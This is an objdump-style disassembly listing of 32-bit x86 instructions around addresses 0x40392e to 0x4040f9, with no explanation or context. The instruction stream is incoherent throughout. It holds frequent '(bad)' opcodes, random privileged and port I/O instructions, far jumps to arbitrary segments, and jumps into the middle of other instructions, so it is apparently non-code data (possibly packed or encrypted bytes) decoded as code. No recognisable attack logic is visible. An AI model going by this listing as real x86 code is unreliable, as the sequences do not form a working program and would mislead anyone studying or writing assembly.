  40392e:	mov    eax,ds:0x84d85531
  403933:	pop    ds
  403934:	push   esp
  403935:	ja     0x40399c
  403937:	push   0x471cf195
  40393c:	popf   
  40393d:	cmp    eax,0xcbfec9da
  403942:	and    BYTE PTR [ebx-0x52],dh
  403945:	mov    ch,0xec
  403947:	push   ecx
  403948:	clc    
  403949:	(bad)  
  40394a:	fisttp WORD PTR ds:0x710c02a0
  403950:	stos   BYTE PTR es:[edi],al
  403951:	pushf  
  403952:	jmp    0x19bd:0x810a861e
  403959:	fsubr  DWORD PTR [edx+ebx*8]
  40395c:	cwde   
  40395d:	std    
  40395e:	add    al,0x7
  403960:	sbb    esp,eax
  403962:	push   cs
  403963:	ffree  st(5)
  403965:	out    0xaa,eax
  403967:	scas   al,BYTE PTR es:[edi]
  403968:	fpatan 
  40396a:	push   es
  40396b:	mov    al,ds:0x2938e123
  403970:	push   esp
  403971:	mov    eax,0xff7cb97e
  403976:	(bad)  
  403977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403978:	cmc    
  403979:	jp     0x403968
  40397b:	adc    al,0x26
  40397d:	push   ebx
  40397e:	aad    0x1c
  403980:	mov    cs,WORD PTR [ebp+0x20]
  403983:	retfw  
  403985:	(bad)  
  403986:	ror    al,1
  403988:	xor    ebx,DWORD PTR [edi+ebx*8-0x5c812d85]
  40398f:	test   DWORD PTR [edx-0x42],eax
  403992:	in     al,0x6
  403994:	mov    cl,0x34
  403996:	sahf   
  403997:	out    dx,eax
  403998:	cmp    al,0xea
  40399a:	push   ebx
  40399b:	push   eax
  40399c:	adc    edx,DWORD PTR [ebp+0x433b93b3]
  4039a2:	push   ds
  4039a3:	jmp    0xe7704de3
  4039a8:	repnz rcl BYTE PTR [ebx-0x184baf7c],cl
  4039af:	pop    esp
  4039b0:	bound  ecx,QWORD PTR [ebp-0x5a]
  4039b3:	inc    edx
  4039b4:	sar    BYTE PTR [edi+ebp*1],0xa1
  4039b8:	push   ds
  4039b9:	es sbb edx,eax
  4039bc:	push   esp
  4039bd:	dec    esi
  4039be:	sub    al,0xaf
  4039c0:	loop   0x4039f7
  4039c2:	loopne 0x403a12
  4039c4:	rol    DWORD PTR [ecx-0x77bff870],1
  4039ca:	clc    
  4039cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039cc:	mov    edi,0x7f8869be
  4039d1:	pop    esp
  4039d2:	mov    edi,0x897f81fe
  4039d7:	mov    ch,0x16
  4039d9:	je     0x403a51
  4039db:	icebp  
  4039dc:	push   edi
  4039dd:	xor    al,0xc0
  4039df:	adc    al,0xc5
  4039e1:	pop    ds
  4039e2:	arpl   WORD PTR [ecx],sp
  4039e4:	push   ecx
  4039e5:	push   ecx
  4039e6:	(bad)  
  4039e7:	int    0x73
  4039e9:	stos   BYTE PTR es:[edi],al
  4039ea:	daa    
  4039eb:	movntq (bad),mm0
  4039ec:	out    0xc7,eax
  4039ee:	jbe    0x4039fb
  4039f0:	scas   eax,DWORD PTR es:[edi]
  4039f1:	xchg   esp,eax
  4039f2:	retf   0x4e8e
  4039f5:	fwait
  4039f6:	mov    ebp,0xd87363b9
  4039fb:	push   0xffffff8c
  4039fd:	add    al,0xee
  4039ff:	and    eax,0xfbf2e9fc
  403a04:	ss stc 
  403a06:	adc    eax,0xa5ae3fbc
  403a0b:	dec    edx
  403a0c:	sti    
  403a0d:	or     DWORD PTR [edi],0x61
  403a10:	mov    BYTE PTR [ecx+0x52],ah
  403a13:	push   edi
  403a14:	cli    
  403a15:	lea    esp,[esi+esi*2-0x53376563]
  403a1c:	hlt    
  403a1d:	not    BYTE PTR [ecx-0x7d]
  403a20:	and    eax,0x8a1b77cf
  403a25:	push   cs
  403a26:	and    eax,0x4793eedd
  403a2b:	std    
  403a2c:	mov    al,ds:0x91f35956
  403a31:	mov    edx,0x1f9d2443
  403a36:	pop    ebx
  403a37:	popa   
  403a38:	int    0x72
  403a3a:	and    dh,cl
  403a3c:	mov    al,0xa2
  403a3e:	ss aaa 
  403a40:	data16 cmp BYTE PTR [esi+0x1e7f9d99],dh
  403a47:	iret   
  403a48:	dec    BYTE PTR [edi-0x54]
  403a4b:	(bad)  
  403a4c:	into   
  403a4d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  403a4f:	cmc    
  403a50:	cmp    ah,BYTE PTR [ebx-0x73a93b60]
  403a56:	cwde   
  403a57:	retf   0xe2ed
  403a5a:	inc    ebx
  403a5b:	xchg   ebp,eax
  403a5c:	mov    gs,WORD PTR [ecx]
  403a5e:	nop
  403a5f:	push   ds
  403a60:	out    0x1d,al
  403a62:	add    BYTE PTR [esi-0x9ee064c],al
  403a68:	sbb    edi,DWORD PTR [edi]
  403a6a:	inc    edi
  403a6b:	in     eax,0x60
  403a6d:	outs   dx,BYTE PTR ds:[esi]
  403a6e:	mov    ah,0x35
  403a70:	ror    BYTE PTR [ebx-0x44c9c69c],0x29
  403a77:	test   eax,0xf8a43e14
  403a7c:	retf   0xb52e
  403a7f:	ds aad 0xf7
  403a82:	sub    DWORD PTR [edi],ebp
  403a84:	lods   al,BYTE PTR ds:[esi]
  403a85:	jge    0x403a81
  403a87:	movsx  edi,BYTE PTR [ebx]
  403a8a:	push   edx
  403a8b:	aad    0xe8
  403a8d:	inc    eax
  403a8e:	rcr    ebx,1
  403a90:	xor    eax,0x892f263c
  403a95:	mov    ch,0xc4
  403a97:	push   0xffffff92
  403a99:	rcl    BYTE PTR ds:0x6250efe3,cl
  403a9f:	adc    cl,BYTE PTR [edi-0x4]
  403aa2:	aam    0xd2
  403aa4:	jmp    0x5241c491
  403aa9:	lods   eax,DWORD PTR ds:[esi]
  403aaa:	loope  0x403a58
  403aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aad:	and    edx,DWORD PTR [eax-0x3b]
  403ab0:	pop    ebx
  403ab1:	pushf  
  403ab2:	mov    eax,0xe2a468cb
  403ab7:	inc    ebp
  403ab8:	mov    ds:0xdd34fe5b,al
  403abd:	mov    ?,WORD PTR [ebx]
  403abf:	fs pushf 
  403ac1:	push   0x61
  403ac3:	data16 mov bh,0x5e
  403ac6:	aam    0xb5
  403ac8:	shr    BYTE PTR [edx+edx*8],1
  403acb:	fldenv [eax-0x6]
  403ace:	sbb    al,0x54
  403ad0:	lock push edi
  403ad2:	cli    
  403ad3:	push   0x6ff8fe7b
  403ad8:	mov    eax,ds:0xde4230a4
  403add:	test   BYTE PTR [esi+0x3f1e6982],bl
  403ae3:	jbe    0x403a6c
  403ae5:	repnz mov bl,0x85
  403ae8:	mov    edi,DWORD PTR [edx]
  403aea:	ja     0x403aa6
  403aec:	adc    eax,0x839d5473
  403af1:	lea    esi,[edx-0x7d5d3c4d]
  403af7:	scas   eax,DWORD PTR es:[edi]
  403af8:	or     esp,DWORD PTR [ebx-0x49ce3263]
  403afe:	pushf  
  403aff:	jmp    0x403a8f
  403b01:	lock in al,0x2b
  403b04:	enter  0xaca7,0x70
  403b08:	aam    0x8
  403b0a:	popa   
  403b0b:	popa   
  403b0c:	ret    
  403b0d:	fisttp QWORD PTR [edi+0x4a]
  403b10:	jecxz  0x403b1d
  403b12:	xchg   BYTE PTR [ecx-0xb],dl
  403b15:	sub    esp,DWORD PTR [esi+0x24]
  403b18:	iret   
  403b19:	mov    ebx,0x5ff027f0
  403b1e:	aam    0xae
  403b20:	pop    esp
  403b21:	outs   dx,DWORD PTR ds:[esi]
  403b22:	mov    ds:0x7dd8e6d9,eax
  403b27:	dec    esi
  403b28:	(bad)  
  403b29:	sub    al,0x6f
  403b2b:	(bad)  
  403b2c:	mov    bp,0x7bcc
  403b30:	inc    edi
  403b31:	dec    eax
  403b32:	mov    ds:0xbfd055e2,al
  403b37:	adc    al,0xaa
  403b39:	test   al,0x44
  403b3b:	call   0xf05d00ff
  403b40:	xchg   edi,eax
  403b41:	shl    DWORD PTR ds:0x21d79075,1
  403b47:	sub    cl,bh
  403b49:	loope  0x403b6b
  403b4b:	mov    DWORD PTR ds:0x96b06d13,ebx
  403b51:	adc    DWORD PTR [ebx-0x33],0xffffff8e
  403b55:	jbe    0x403b93
  403b57:	xchg   edx,eax
  403b58:	xchg   esp,eax
  403b59:	pop    ebx
  403b5a:	mov    ds,esi
  403b5c:	jns    0x403b0d
  403b5e:	(bad)  
  403b5f:	cs or  al,0x6a
  403b62:	loop   0x403b99
  403b64:	int3   
  403b65:	dec    ebp
  403b66:	ins    BYTE PTR es:[edi],dx
  403b67:	das    
  403b68:	xchg   esp,eax
  403b69:	mov    edx,0xa15652fa
  403b6e:	in     eax,0xb3
  403b70:	dec    edi
  403b71:	jl     0x403b82
  403b73:	enter  0x139e,0xbb
  403b77:	cmp    DWORD PTR [ecx],ebx
  403b79:	jge    0x403bae
  403b7b:	dec    esp
  403b7c:	sbb    al,0xde
  403b7e:	sub    DWORD PTR [esi+0x70f4a9fb],esi
  403b84:	push   edx
  403b85:	sbb    ch,dl
  403b87:	enter  0x220c,0x40
  403b8b:	lods   al,BYTE PTR ds:[esi]
  403b8c:	mov    ecx,0xd509700c
  403b91:	cmp    dh,BYTE PTR [esi+0x6dd59b63]
  403b97:	cmp    BYTE PTR [ecx],bh
  403b99:	into   
  403b9a:	ret    0x86fe
  403b9d:	call   0xb7ce150c
  403ba2:	aaa    
  403ba3:	scas   al,BYTE PTR es:[edi]
  403ba4:	jp     0x403b6c
  403ba6:	data16 (bad) 
  403ba8:	xchg   ecx,eax
  403ba9:	retf   0x5e6b
  403bac:	aaa    
  403bad:	lods   al,BYTE PTR ds:[esi]
  403bae:	and    DWORD PTR [ebp-0x76],ecx
  403bb1:	popf   
  403bb2:	and    al,BYTE PTR [esi]
  403bb4:	add    ecx,edx
  403bb6:	xchg   edx,eax
  403bb7:	or     eax,0x5e
  403bba:	or     eax,0x99c11f63
  403bbf:	cmp    al,0x69
  403bc1:	shl    DWORD PTR [ebx],cl
  403bc3:	jb     0x403c13
  403bc5:	hlt    
  403bc6:	jecxz  0x403c15
  403bc8:	popa   
  403bc9:	cmp    DWORD PTR [edx+0x187fd445],esi
  403bcf:	mov    esp,0xa2182c5d
  403bd4:	mov    esi,0xf22acef7
  403bd9:	cmp    DWORD PTR [ecx-0x3117c7d],0xffffffea
  403be0:	lds    esp,FWORD PTR ss:[ecx-0x635daa9f]
  403be7:	fwait
  403be8:	mov    bh,0x9c
  403bea:	lods   al,BYTE PTR ds:[esi]
  403beb:	mov    ?,WORD PTR [ecx]
  403bed:	jmp    0x403bc8
  403bef:	xchg   esp,eax
  403bf0:	mov    ch,al
  403bf2:	test   eax,0xf8584508
  403bf7:	dec    esp
  403bf8:	icebp  
  403bf9:	call   0x7975:0x4b048ed
  403c00:	popa   
  403c01:	(bad)  
  403c02:	mov    edx,0x7db82e88
  403c07:	hlt    
  403c08:	aaa    
  403c09:	ins    BYTE PTR es:[edi],dx
  403c0a:	pusha  
  403c0b:	(bad)  
  403c0c:	(bad)
  403c0f:	jno    0x403c4e
  403c11:	dec    edi
  403c12:	mov    ebx,0xed88caaa
  403c17:	and    al,0x4
  403c19:	mov    cl,0x23
  403c1b:	push   cs
  403c1c:	std    
  403c1d:	push   esi
  403c1e:	or     DWORD PTR [ebp+0x6d],esi
  403c21:	outs   dx,BYTE PTR ds:[esi]
  403c22:	pop    es
  403c23:	fisubr WORD PTR [ebp+0x2b]
  403c26:	jae    0x403ca7
  403c28:	xor    al,0x84
  403c2a:	and    al,0x0
  403c2c:	and    ecx,ebx
  403c2e:	cli    
  403c2f:	(bad)  es:[edi]
  403c32:	inc    eax
  403c33:	pusha  
  403c34:	mov    ?,WORD PTR [ecx+0x67abf8eb]
  403c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c3b:	add    BYTE PTR [ebx+0x33b8b139],cl
  403c41:	loopne 0x403ca9
  403c43:	test   BYTE PTR [esi],cl
  403c45:	das    
  403c46:	lea    ebp,[edx+0x6a2adfdc]
  403c4c:	ins    DWORD PTR es:[edi],dx
  403c4d:	fist   WORD PTR ds:0x69a94e93
  403c53:	jae    0x403c84
  403c55:	outs   dx,DWORD PTR ds:[esi]
  403c56:	fcomp  QWORD PTR [esi-0x75]
  403c59:	std    
  403c5a:	dec    ecx
  403c5b:	into   
  403c5c:	push   cs
  403c5d:	pop    ebx
  403c5e:	or     DWORD PTR [edi],0x16910641
  403c64:	sub    eax,DWORD PTR [esi]
  403c66:	and    eax,DWORD PTR [esi+ecx*4]
  403c69:	mov    ds,WORD PTR [ecx+0x58]
  403c6c:	ret    0x37b2
  403c6f:	cmp    eax,DWORD PTR [ecx+ebx*1+0x6a754ece]
  403c76:	add    DWORD PTR [ecx],0xfffffff3
  403c79:	leave  
  403c7a:	ja     0x403cdc
  403c7c:	sbb    al,BYTE PTR [edx]
  403c7e:	sbb    BYTE PTR [eax+0x208f0df0],bl
  403c84:	mov    ecx,0xa8dfaaf9
  403c89:	ss dec edi
  403c8b:	out    0x3c,al
  403c8d:	outs   dx,DWORD PTR ds:[esi]
  403c8e:	cwde   
  403c8f:	mov    esp,0x49ec23be
  403c94:	lods   al,BYTE PTR ds:[esi]
  403c95:	mov    al,ds:0xc05fb0c6
  403c9a:	sub    eax,ecx
  403c9c:	sub    DWORD PTR [edi],edx
  403c9e:	and    cl,bl
  403ca0:	and    ah,BYTE PTR [ebx]
  403ca2:	std    
  403ca3:	dec    esp
  403ca4:	bound  esi,QWORD PTR [eax-0x66]
  403ca7:	xchg   ebp,eax
  403ca8:	repz mov ds:0xb98fce4e,eax
  403cae:	pop    edx
  403caf:	cmp    BYTE PTR [ebx],cl
  403cb1:	or     cl,BYTE PTR [eax-0x23]
  403cb4:	js     0x403c57
  403cb6:	inc    eax
  403cb7:	stos   DWORD PTR es:[edi],eax
  403cb8:	stc    
  403cb9:	mov    ds,ebp
  403cbb:	jo     0x403c8b
  403cbd:	ja     0x403cdb
  403cbf:	xchg   ebx,eax
  403cc0:	add    BYTE PTR [esi+0x24],dh
  403cc3:	cmp    edi,DWORD PTR [eax-0x6819881d]
  403cc9:	stos   BYTE PTR es:[edi],al
  403cca:	out    0xe9,eax
  403ccc:	sbb    edx,0x1dff4a30
  403cd2:	jne    0x403d27
  403cd4:	ficomp DWORD PTR [ecx-0x41c011ad]
  403cda:	mov    edx,0x96d37fac
  403cdf:	add    BYTE PTR [esi+0x65],bl
  403ce2:	xor    eax,0xa0fe8095
  403ce7:	out    0xee,eax
  403ce9:	(bad)  
  403ced:	push   ecx
  403cee:	imul   ecx,DWORD PTR [eax],0x1e859c05
  403cf4:	pop    esi
  403cf5:	imul   esi,ebx,0x67
  403cf8:	pop    ebx
  403cf9:	push   es
  403cfa:	cwde   
  403cfb:	out    0x7f,eax
  403cfd:	daa    
  403cfe:	xchg   BYTE PTR [ebx],ah
  403d00:	sbb    al,0xb0
  403d02:	cmp    esp,esp
  403d04:	xchg   edi,eax
  403d05:	or     bl,BYTE PTR ds:0x3eedb5a4
  403d0b:	push   ebp
  403d0c:	mov    esp,0x996f8909
  403d11:	cdq    
  403d12:	fild   DWORD PTR [esi+0xa]
  403d15:	ss mov ebx,0x96c03f01
  403d1b:	xchg   esp,ecx
  403d1d:	das    
  403d1e:	inc    ecx
  403d1f:	adc    BYTE PTR [esi],ah
  403d21:	fs jmp 0x3b7bbb03
  403d27:	fwait
  403d28:	cwde   
  403d29:	pop    esp
  403d2a:	sbb    ah,BYTE PTR [ebp-0x5]
  403d2d:	add    DWORD PTR ds:0xcbd894e9,ebx
  403d33:	sub    eax,0xf6900d3b
  403d38:	out    0xe5,al
  403d3a:	jmp    0x8637:0x11df6c37
  403d41:	scas   eax,DWORD PTR es:[edi]
  403d42:	mov    ds:0xcf9844a9,al
  403d47:	mov    ch,0x62
  403d49:	ds pop esi
  403d4b:	retf   0x36e9
  403d4e:	leave  
  403d4f:	add    dh,BYTE PTR [eax+0x42]
  403d52:	retf   0xbb25
  403d55:	push   edx
  403d56:	stos   BYTE PTR es:[edi],al
  403d57:	pop    esi
  403d58:	std    
  403d59:	jno    0x403d6e
  403d5b:	pop    esp
  403d5c:	sub    edi,DWORD PTR [esi]
  403d5e:	adc    eax,0x9f785201
  403d63:	pop    edx
  403d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d65:	push   ebp
  403d66:	mov    esi,0x332e178c
  403d6b:	adc    edx,DWORD PTR [esi+0x2c]
  403d6e:	stc    
  403d6f:	inc    ecx
  403d70:	fcmovb st,st(7)
  403d72:	sbb    edx,DWORD PTR [ecx]
  403d74:	push   ss
  403d75:	xor    eax,0x70c6358b
  403d7a:	mov    bh,0x36
  403d7c:	test   eax,0xd5845bb5
  403d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d82:	mov    edx,0xbfcb6f3b
  403d87:	sbb    eax,0xbb4c203d
  403d8c:	out    dx,eax
  403d8d:	push   0x43
  403d8f:	cmp    bh,BYTE PTR [edx-0x12]
  403d92:	je     0x403d62
  403d94:	cwde   
  403d95:	sbb    eax,eax
  403d97:	pop    esi
  403d98:	or     esp,esi
  403d9a:	jb     0x403d4d
  403d9c:	cmp    eax,0x8241089f
  403da1:	shl    DWORD PTR [edx],0xb0
  403da4:	loope  0x403df7
  403da6:	jno    0x403e0b
  403da8:	ins    DWORD PTR es:[edi],dx
  403da9:	push   ebp
  403daa:	xchg   BYTE PTR [edx+ebx*1+0x28],ch
  403dae:	div    DWORD PTR [edi+0x1e]
  403db1:	sbb    eax,DWORD PTR [edx]
  403db3:	sbb    eax,0x4f43dc2b
  403db8:	xor    al,0x25
  403dba:	jmp    0x6c01:0x4b3953ce
  403dc1:	(bad)  
  403dc2:	push   ebp
  403dc3:	push   edi
  403dc4:	mov    eax,0x6845d507
  403dc9:	sub    bl,cl
  403dcb:	adc    eax,0xabc52a88
  403dd0:	inc    edx
  403dd1:	pop    es
  403dd2:	imul   eax,DWORD PTR [ebx+0x4e],0x65ebbeb2
  403dd9:	pushf  
  403dda:	(bad)  
  403ddc:	push   0xffffff95
  403dde:	data16 mov dl,0xc2
  403de1:	push   esi
  403de2:	out    0xc2,eax
  403de4:	or     eax,0xb5e74c15
  403de9:	aaa    
  403dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403deb:	add    al,BYTE PTR [ebx]
  403ded:	sub    WORD PTR [edx-0x66daa339],ax
  403df4:	jge    0x403dcd
  403df6:	cmp    ch,BYTE PTR [ecx]
  403df8:	mov    dl,0xe0
  403dfa:	rcl    BYTE PTR [edi-0x6d9683e0],cl
  403e00:	and    cl,BYTE PTR [esp+ecx*2]
  403e03:	xchg   esp,eax
  403e04:	sbb    esi,DWORD PTR [edi-0x59]
  403e07:	dec    ecx
  403e08:	push   ebp
  403e09:	popf   
  403e0a:	fwait
  403e0b:	or     al,0x89
  403e0d:	adc    al,0xc6
  403e0f:	mov    cl,0xa2
  403e11:	mov    ebp,0xb06ebec4
  403e16:	push   ss
  403e17:	popa   
  403e18:	sbb    bl,al
  403e1a:	lods   al,BYTE PTR ds:[esi]
  403e1b:	jbe    0x403e2b
  403e1d:	cmp    ah,BYTE PTR [ecx+0x27]
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	test   DWORD PTR [edx+0x96878b3],esp
  403e27:	aad    0x88
  403e29:	leave  
  403e2a:	(bad)  [ebx+0x4a]
  403e2d:	jne    0x403e2c
  403e2f:	and    eax,DWORD PTR [ebx+esi*2-0x754479e7]
  403e36:	sbb    DWORD PTR [edx+ebx*8+0x5d396ad0],esi
  403e3d:	pop    edx
  403e3e:	or     cl,BYTE PTR [edx]
  403e40:	and    al,0xd7
  403e42:	cli    
  403e43:	mov    cl,0xe0
  403e45:	js     0x403df0
  403e47:	push   ebx
  403e48:	imul   ecx,DWORD PTR [eax*2+0x21666ec4],0xffffffa5
  403e50:	inc    edx
  403e51:	and    cl,dl
  403e53:	mov    ebx,0xa8296c81
  403e58:	addr16 cli 
  403e5a:	add    al,0xa4
  403e5c:	pop    ecx
  403e5d:	into   
  403e5e:	jne    0x403e62
  403e60:	not    DWORD PTR [edx]
  403e62:	aad    0xd4
  403e64:	fucomp st(7)
  403e66:	lods   eax,DWORD PTR ds:[esi]
  403e67:	pop    ecx
  403e68:	xlat   BYTE PTR ds:[bx]
  403e6a:	inc    edx
  403e6b:	push   ecx
  403e6c:	repz sub ch,BYTE PTR [ebp+0x1187d72d]
  403e73:	mov    DWORD PTR [ecx-0x477d8df0],ebp
  403e79:	pop    ecx
  403e7a:	and    al,0x98
  403e7c:	loope  0x403e76
  403e7e:	jg     0x403ee2
  403e80:	xchg   esp,eax
  403e81:	frstor [esi-0x1ab5be09]
  403e87:	test   al,0x40
  403e89:	adc    bl,dh
  403e8b:	ret    
  403e8c:	dec    eax
  403e8d:	mov    esp,0xd42cdb8
  403e92:	fldenv [esi]
  403e94:	das    
  403e95:	pop    ecx
  403e96:	in     al,dx
  403e97:	xlat   BYTE PTR ds:[ebx]
  403e98:	ins    BYTE PTR es:[edi],dx
  403e99:	and    DWORD PTR [ecx],0x6b553049
  403e9f:	jmp    DWORD PTR [edi+0x73]
  403ea2:	addr16 call 0xb982:0x7f1390ad
  403eaa:	adc    cl,BYTE PTR [eax]
  403eac:	sub    bh,BYTE PTR [eax+0x46]
  403eaf:	adc    bx,WORD PTR [esp+edi*4+0x6bd87b82]
  403eb7:	mov    eax,0x323ad69e
  403ebc:	mov    ecx,0x22b74845
  403ec1:	ds jmp 0xd0de:0x79bb40f1
  403ec9:	dec    esi
  403eca:	dec    ecx
  403ecb:	xor    DWORD PTR [edi],esi
  403ecd:	fnstsw WORD PTR [ecx+0xe]
  403ed0:	cmc    
  403ed1:	xor    BYTE PTR ds:0xba3765f2,al
  403ed7:	or     eax,0xe91eedf2
  403edc:	rcr    BYTE PTR [ebp+0x1c],1
  403edf:	cmp    al,0xa6
  403ee1:	mov    ah,0xfd
  403ee3:	sti    
  403ee4:	imul   ebx,DWORD PTR [esi+0x3a],0x54
  403ee8:	aad    0x9e
  403eea:	stos   DWORD PTR es:[edi],eax
  403eeb:	out    dx,eax
  403eec:	or     DWORD PTR [ebx-0x60980994],esp
  403ef2:	repz pop ds
  403ef4:	sbb    DWORD PTR [esi+0x69],eax
  403ef7:	jo     0x403f51
  403ef9:	mov    al,ds:0xdb349e88
  403efe:	popa   
  403eff:	out    dx,al
  403f00:	retf   0x3d28
  403f03:	sub    bh,BYTE PTR [eax+ecx*2+0xf66612]
  403f0a:	ficom  WORD PTR [edx-0xf]
  403f0d:	(bad)  
  403f0e:	imul   eax,DWORD PTR [edx+0x27c402f4],0xe1fed0f7
  403f18:	jg     0x403f94
  403f1a:	fst    DWORD PTR [ebx]
  403f1c:	mov    fs,esp
  403f1e:	rcr    BYTE PTR [ebp-0x34],cl
  403f21:	jg     0x403f16
  403f23:	mov    bh,0x53
  403f25:	add    al,0x3b
  403f27:	arpl   WORD PTR [ebx-0x31],si
  403f2a:	(bad)  
  403f2b:	mov    WORD PTR [edi+ebp*8],ds
  403f2e:	sub    al,0xa3
  403f30:	sti    
  403f31:	inc    esi
  403f32:	adc    edx,ebp
  403f34:	gs out 0xb0,al
  403f37:	shl    DWORD PTR [eax+edi*8],cl
  403f3a:	cmp    BYTE PTR ds:0x8e770d89,al
  403f40:	arpl   WORD PTR [eax+edi*2-0x16],sp
  403f44:	or     BYTE PTR [edi],bl
  403f46:	mov    al,BYTE PTR [ebp+eiz*8-0x2a]
  403f4a:	jo     0x403f76
  403f4c:	fcomp  QWORD PTR [edi+edi*1]
  403f4f:	pop    eax
  403f50:	and    DWORD PTR [ebp+0x60],0xbade740c
  403f57:	mov    fs:0x2f226960,eax
  403f5d:	es mov ah,0xb8
  403f60:	pop    ebp
  403f61:	rcr    BYTE PTR [eax],cl
  403f63:	sbb    BYTE PTR [esi-0x5e],cl
  403f66:	mov    edx,0x19dcb5e8
  403f6b:	xlat   BYTE PTR ds:[ebx]
  403f6c:	adc    edx,DWORD PTR [edi]
  403f6e:	ja     0x403f12
  403f70:	outs   dx,BYTE PTR ds:[esi]
  403f71:	or     ebp,DWORD PTR ds:0xe9189df3
  403f77:	enter  0x2bf2,0xe
  403f7b:	retf   0x8725
  403f7e:	xchg   ebx,eax
  403f7f:	hlt    
  403f80:	ret    0x6126
  403f83:	push   0x56
  403f85:	xchg   edx,eax
  403f86:	xor    al,0x98
  403f88:	sahf   
  403f89:	adc    esp,ebx
  403f8b:	rcl    DWORD PTR [esi+esi*2],cl
  403f8e:	call   0x4987:0xfa57ffac
  403f95:	addr16 pusha 
  403f97:	xor    eax,0x1025f87d
  403f9c:	sub    al,0xa8
  403f9e:	cmp    dh,BYTE PTR [edi-0x63]
  403fa1:	stos   BYTE PTR es:[edi],al
  403fa2:	sbb    al,0x8a
  403fa4:	in     eax,dx
  403fa5:	mov    al,0xad
  403fa7:	fmulp  st(6),st
  403fa9:	mov    bl,0xa1
  403fab:	outs   dx,DWORD PTR ds:[esi]
  403fac:	outs   dx,BYTE PTR ds:[esi]
  403fad:	xor    edi,esp
  403faf:	jno    0x40401a
  403fb1:	inc    ebp
  403fb2:	lock fldenv [ecx+edi*2]
  403fb6:	outs   dx,BYTE PTR ds:[esi]
  403fb7:	daa    
  403fb8:	iret   
  403fb9:	into   
  403fba:	jno    0x404014
  403fbc:	inc    eax
  403fbd:	cwde   
  403fbe:	push   edi
  403fbf:	mov    eax,0x5e4d0a17
  403fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc5:	mov    cl,0xac
  403fc7:	xchg   ebx,eax
  403fc8:	push   esi
  403fc9:	stc    
  403fca:	addr16 addr16 pop esp
  403fcd:	jno    0x403f83
  403fcf:	push   0x343a8962
  403fd4:	sub    DWORD PTR [edi],0xec356037
  403fda:	add    al,0x2f
  403fdc:	mov    ah,0x34
  403fde:	xor    eax,0xcad1d52d
  403fe3:	sar    BYTE PTR ds:0x5de567a3,cl
  403fe9:	adc    eax,0xb9eb21be
  403fee:	xchg   ecx,eax
  403fef:	jmp    0x6dd2:0xf057271d
  403ff6:	fdivr  DWORD PTR [eax-0x6d]
  403ff9:	mov    eax,ds:0x3bc96829
  403ffe:	lods   al,BYTE PTR ds:[esi]
  403fff:	xchg   DWORD PTR [esp+esi*2-0x7869e85e],ebx
  404006:	hlt    
  404007:	aam    0x42
  404009:	cmc    
  40400a:	daa    
  40400b:	out    0x34,al
  40400d:	cmp    DWORD PTR cs:[ecx-0x46dd3d24],ecx
  404014:	stos   BYTE PTR es:[edi],al
  404015:	cmp    ch,BYTE PTR [edx+0x69]
  404018:	adc    bh,BYTE PTR [eax+0x7b]
  40401b:	(bad)  
  40401c:	test   BYTE PTR [eax+0x21],cl
  40401f:	ins    BYTE PTR es:[edi],dx
  404020:	push   esi
  404021:	mov    edx,0x69a35b40
  404026:	data16 ficomp WORD PTR [ebx+0x1c]
  40402a:	mov    bh,0x7e
  40402c:	in     al,0x63
  40402e:	call   0xd24f:0xd96d3893
  404035:	mov    DWORD PTR [edx-0x36],ebp
  404038:	lds    esp,FWORD PTR [edx]
  40403a:	cs pop ebp
  40403c:	pusha  
  40403d:	retf   0x5814
  404040:	lods   al,BYTE PTR ds:[esi]
  404041:	and    esp,DWORD PTR [edx]
  404043:	sub    al,0x16
  404045:	push   0x23
  404047:	lock aaa 
  404049:	fdivp  st(5),st
  40404b:	push   eax
  40404c:	add    eax,0x866e0734
  404051:	dec    DWORD PTR [ebp-0x45]
  404054:	jne    0x404060
  404056:	popa   
  404057:	mov    ebx,0x408de892
  40405c:	add    al,0x95
  40405e:	push   0xffffffea
  404060:	push   0x56082800
  404065:	jmp    FWORD PTR [edx]
  404067:	sub    esp,DWORD PTR [edx+0x635b1bb5]
  40406d:	xor    eax,0xef60456b
  404072:	setns  ah
  404075:	adc    eax,0xe0f611d6
  40407a:	cld    
  40407b:	test   al,0x7d
  40407d:	ffree  st(5)
  40407f:	or     al,cl
  404081:	mov    dl,0x6d
  404083:	add    BYTE PTR [esi-0x2c6f84b9],dl
  404089:	pop    eax
  40408a:	pop    esi
  40408b:	push   es
  40408c:	pop    esi
  40408d:	sar    DWORD PTR [eax],0x64
  404090:	push   0xfffffffb
  404092:	push   0x22
  404094:	push   0xffba7243
  404099:	jmp    0x981efdbf
  40409e:	arpl   bx,cx
  4040a0:	in     eax,0xcf
  4040a2:	cmp    eax,0x4a23ef3c
  4040a7:	inc    edx
  4040a8:	pop    esp
  4040a9:	pop    ss
  4040aa:	inc    ecx
  4040ab:	inc    ebp
  4040ac:	xlat   BYTE PTR ds:[ebx]
  4040ad:	or     edi,ebx
  4040af:	mov    eax,ds:0x816406cf
  4040b4:	xchg   DWORD PTR [eax+0x6c37412],ebx
  4040ba:	mov    WORD PTR [esp+edx*1],ds
  4040bd:	mov    edi,0xc736161d
  4040c2:	xor    DWORD PTR [ebx+0x39b81f93],edx
  4040c8:	loop   0x404076
  4040ca:	icebp  
  4040cb:	pop    esi
  4040cc:	inc    edi
  4040cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ce:	lea    ecx,[ebp+0x5e3c4546]
  4040d4:	clc    
  4040d5:	in     al,0x3f
  4040d7:	adc    BYTE PTR [ecx+0x27c83913],0xef
  4040de:	retf   0x9589
  4040e1:	loope  0x4040c0
  4040e3:	aas    
  4040e4:	xchg   ecx,eax
  4040e5:	mov    dl,0x15
  4040e7:	retf   0x1753
  4040ea:	out    dx,ax
  4040ec:	sbb    ebx,DWORD PTR [edi+0x40]
  4040ef:	sub    ch,BYTE PTR [eax*8+0x55e5d310]
  4040f6:	cmp    al,0xfa
  4040f8:	inc    ebx
  4040f9:	mov    ds:0x36f5cb65,eax
